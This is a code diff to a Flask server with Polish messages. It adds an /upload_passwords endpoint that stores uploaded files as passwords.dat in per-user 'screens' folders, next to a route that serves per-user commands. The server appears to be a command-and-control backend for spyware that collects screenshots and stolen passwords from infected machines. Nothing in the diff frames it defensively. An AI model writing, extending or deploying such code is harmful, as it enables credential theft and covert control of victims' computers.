@@ -171,6 +171,19 @@ def command():
         with open(command_file, "r") as f:
             return jsonify(json.load(f))
 
+@app.route("/upload_passwords", methods=['POST'])
+def upload_passwords():
+    user = request.form.get("user")
+    if not user:
+        return "Brak ID użytkownika", 400
+    folder = os.path.join("screens", user)
+    os.makedirs(folder, exist_ok=True)
+
+    file = request.files['data']
+    filepath = os.path.join(folder, "passwords.dat")
+    file.save(filepath)
+    return "OK"
+
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
